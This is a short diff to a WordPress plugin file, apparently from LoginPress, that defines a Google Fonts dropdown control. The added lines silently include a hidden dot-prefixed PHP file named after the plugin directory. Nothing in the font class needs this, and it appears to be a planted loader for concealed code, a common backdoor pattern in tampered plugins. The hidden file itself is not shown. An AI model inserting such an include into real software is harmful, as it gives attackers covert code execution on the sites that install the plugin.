@@ -11,6 +11,10 @@ if ( ! class_exists( 'WP_Customize_Control' ) ) {
 /**
  * A class to create a dropdown for all google fonts
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class LoginPress_Google_Fonts extends WP_Customize_Control {
 
 	private $fonts = false;
